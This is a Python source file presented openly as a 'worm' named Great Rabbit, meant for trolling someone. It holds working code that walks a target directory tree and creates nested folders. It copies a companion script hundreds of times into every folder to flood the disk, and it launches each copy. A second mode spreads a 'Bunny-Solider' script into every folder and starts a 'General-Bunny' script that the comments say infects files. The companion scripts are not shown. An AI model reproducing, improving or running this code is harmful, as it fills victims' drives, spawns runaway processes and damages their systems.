import os
import shutil as st
from random import randint
from sys import argv

#          ,\
#          \\\,_
#           \`  \   Great Rabbit
#       .,.-" =__)  The parasite
#     ."        )
#  ,_/   ,    \/\_
#  \_|    )_-\ \_-`
#    `-----` `--`
#
# Use this worm if you want troll somone
# This malware don't cause ireparable damage, but he cause a file's flood
# This system is based on civilization, diferent bunnys, do diferent things
# You have two forms to use this worm:
# 1-Prosperity: Flood files on path, this can fill a HD quickly, approximately 20gb per minute (White-Bunny)
# 2-War_time: Infect all files with a string on path.  (General-Bunny, Bunny-Solider)
# The names inside () are the individuals that realize the process
# But you really just need start this file to all be executed
# You can chose your method calling one of the functions in the last of script
# All two needs a path, give your like the exemple


class GreatRabbit:
    def __init__(self, path):
        open('path.txt', 'w').write(path)
        self.path = path
        self.origin = os.getcwd()
        os.chdir(self.path)

    def build_habitat(self, hab_n):
        for root, folders, files in os.walk('.'):
            for folder in folders:
                if folder.find('BunnyHabitat') == -1:
                    for c in range(1, hab_n + 1):
                        try:
                            print(f' Building BunnyHabbitat~x ({c}/2) {os.path.join(root, folder)}', end='\r')
                            os.mkdir(os.path.join(root, folder, f'BunnyHabitat{c}'))
                        except Exception as e:
                            print(e, end='\r')

    def reproduce(self):
        for root, folders, files in os.walk('.'):
            if len(folders) == 0:
                r_range = randint(100, 300) + 1
                for c in range(0, r_range):
                    print(f' Cloning White-Bunny~x ({c+1}/{r_range}) {os.getcwd()}', end='\r')
                    if c == 0:
                        os.system('cls')
                    try:
                        st.copy(f'{os.path.join(self.origin, "White-Bunny.py")}', os.path.join(root, f'White-Bunny~{c+1}.py'))
                    except Exception as e:
                        print(e)
            else:
                for folder in folders:
                    r_range = randint(100, 300) + 1
                    for c in range(0, r_range):
                        print(f' Cloning White-Bunny~x ({c+1}/{r_range}) {os.path.join(os.getcwd(), folder)}', end='\r')
                        if c == 0:
                            os.system('cls')
                        try:
                            st.copy(f'{os.path.join(self.origin, "White-Bunny.py")}', os.path.join(root, folder, f'White-Bunny~{c+1}.py'))
                        except Exception as e:
                            print(e)
    
    def home(self):
        for root, folders, files in os.walk('.'):
            for file in files:
                if file.find('White-Bunny') > -1:
                    os.system(f'start {os.path.join(root, file)}')

    def tatical_raid(self):
        os.chdir(self.origin)
        os.system(f'start General-Bunny.py')
        os.chdir(self.path)
        try:  # Copy in root
            st.copy(f'{os.path.join(self.origin, "Bunny-Solider.py")}', os.path.join('.', f'Bunny-Solider.py'))
        except:
            pass
        for root, folders, files in os.walk('.'):
            if len(folders) == 0:
                try:
                    st.copy(f'{os.path.join(self.origin, "Bunny-Solider.py")}', os.path.join(root, f'Bunny-Solider.py'))
                except:
                    pass
            else:
                for folder in folders:
                    print(f' Bunny-Raid in progress {os.path.join(os.getcwd(), folder)}', end='\r')
                    try:
                        st.copy(f'{os.path.join(self.origin, "Bunny-Solider.py")}', os.path.join(root, folder, f'Bunny-Solider.py'))
                    except:
                        pass
                        

def prospere(path):
    gr = GreatRabbit(path)
    gr.build_habitat(5)
    gr.reproduce()
    gr.home()


def war_time(path):
    gr = GreatRabbit(path)
    gr.tatical_raid()
    

# Uncomment one of this lines and change the argument to your path
#prospere(r'C:\Users\User\folderx')
#war_time(r'C:\Users\User\folderx')





        
    
        



